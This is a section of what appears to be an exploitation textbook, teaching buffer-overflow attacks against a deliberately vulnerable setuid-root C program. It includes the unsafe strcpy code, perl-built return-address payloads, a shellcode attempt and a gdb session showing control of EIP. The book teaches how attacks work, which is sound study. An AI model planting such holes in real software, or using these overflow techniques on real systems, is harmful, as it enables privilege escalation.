<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x690 Buffer Restrictions</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part150.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part152.htm">Next &gt;</a></p><p class="s30" style="padding-left: 37pt;text-indent: 0pt;text-align: left;"><a name="bookmark138">0x690 Buffer Restrictions</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Sometimes a program will place certain restrictions on buffers. This type of data sanity-checking can prevent many vulnerabilities. Consider the following example program, which is used to update product descriptions in a fictitious database. The first argument is the product code, and the second is the updated description. This program doesn’t actually update a database, but it does have an obvious vulnerability in it.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">update_info.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1111.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#define MAX_ID_LEN 40</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#define MAX_DESC_LEN 500</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/* Barf a message and exit. */</p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">void barf(char *message, void *extra) { printf(message, extra);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exit(1);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/* Pretend this function updates a product description in a database. */ void update_product_description(char *id, char *desc)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 212%;text-align: left;">char product_code[5], description[MAX_DESC_LEN]; printf(&quot;[DEBUG]: description is at %p\n&quot;, description);</p><p class="s31" style="padding-top: 2pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">strncpy(description, desc, MAX_DESC_LEN); strcpy(product_code, id);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">printf(&quot;Updating product #%s with description \&#39;%s\&#39;\n&quot;, product_code, desc);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">// Update database</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">int main(int argc, char *argv[], char *envp[])</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">int i;</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">char *id, *desc;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">if(argc &lt; 2)</p><p class="s31" style="padding-left: 27pt;text-indent: 12pt;line-height: 107%;text-align: left;">barf(&quot;Usage: %s &lt;id&gt; &lt;description&gt;\n&quot;, argv[0]); id = argv[1];  // id - Product code to update in DB desc = argv[2]; // desc - Item description to update</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 40pt;text-indent: -13pt;line-height: 107%;text-align: left;">if(strlen(id) &gt; MAX_ID_LEN) // id must be less than MAX_ID_LEN bytes. barf(&quot;Fatal: id argument must be less than %u bytes\n&quot;, (void *)MAX_ID_LEN);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 40pt;text-indent: -13pt;line-height: 107%;text-align: left;">for(i=0; i &lt; strlen(desc)-1; i++) { // Only allow printable bytes in desc. if(!(isprint(desc[i])))</p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">barf(&quot;Fatal: description argument can only contain printable bytes\n&quot;, NULL);</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">// Clearing out the stack memory (security)</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;line-height: 107%;text-align: left;">// Clearing all arguments except the first and second memset(argv[0], 0, strlen(argv[0]));</p><p class="s31" style="padding-left: 36pt;text-indent: -8pt;line-height: 107%;text-align: left;">for(i=3; argv[i] != 0; i++) memset(argv[i], 0, strlen(argv[i]));</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;line-height: 107%;text-align: left;">// Clearing all environment variables for(i=0; envp[i] != 0; i++)</p><p class="s31" style="padding-left: 27pt;text-indent: 8pt;line-height: 214%;text-align: left;">memset(envp[i], 0, strlen(envp[i])); printf(&quot;[DEBUG]: desc is at %p\n&quot;, desc);</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;line-height: 9pt;text-align: left;">update_product_description(id, desc); // Update database.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1112.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Despite the vulnerability, the code does make an attempt at security. The length of the product ID argument is restricted, and the contents of the description argument are limited to printable characters. In addition, the unused environment variables and program arguments are cleared out for security reasons. The first argument (<span class="s31">id</span>) is too small for shellcode, and since the rest of the stack memory is cleared out, there’s only one place left.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1113.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -o update_info update_info.c reader@hacking:~/booksrc $ sudo chown root ./update_info reader@hacking:~/booksrc $ sudo chmod u+s ./update_info reader@hacking:~/booksrc $ ./update_info</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Usage: ./update_info &lt;id&gt; &lt;description&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./update_info OCP209 &quot;Enforcement Droid&quot; [DEBUG]: description is at 0xbffff650</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Updating product #OCP209 with description &#39;Enforcement Droid&#39; reader@hacking:~/booksrc $</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./update_info $(perl -e &#39;print &quot;AAAA&quot;x10&#39;) blah [DEBUG]: description is at 0xbffff650</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./update_info $(perl -e &#39;print &quot;\xf2\xf9\xff\xbf&quot;x10&#39;) $(cat ./ shellcode.bin)</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Fatal: description argument can only contain printable bytes reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1114.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This output shows a sample usage and then tries to exploit the vulnerable <span class="s31">strcpy() </span>call. Although the return address can be overwritten using the first argument (<span class="s31">id</span>), the only place we can put shellcode is in the second argument (<span class="s31">desc</span>). However, this buffer is checked for nonprintable bytes. The debugging output below confirms that this program could be exploited, if there was a way to put shellcode in the description argument.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1115.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q ./update_info</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) run $(perl -e &#39;print &quot;\xcb\xf9\xff\xbf&quot;x10&#39;) blah</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The program being debugged has been started already. Start it from the beginning? (y or n) y</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/update_info $(perl -e &#39;print &quot;\xcb\xf9\xff\xbf&quot;x10&#39;) blah</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG]: desc is at 0xbffff9cb</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Updating product # with description &#39;blah&#39;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program received signal SIGSEGV, Segmentation fault. 0xbffff9cb in ?? ()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) i r eip</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">eip      0xbffff9cb    0xbffff9cb (gdb) x/s $eip</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff9cb:   &quot;blah&quot; (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1116.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The printable input validation is the only thing stopping exploitation. Like airport security, this input validation loop inspects everything coming in. And while it’s not possible to avoid this check, there are ways to smuggle illicit data past the guards.</p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part150.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part152.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
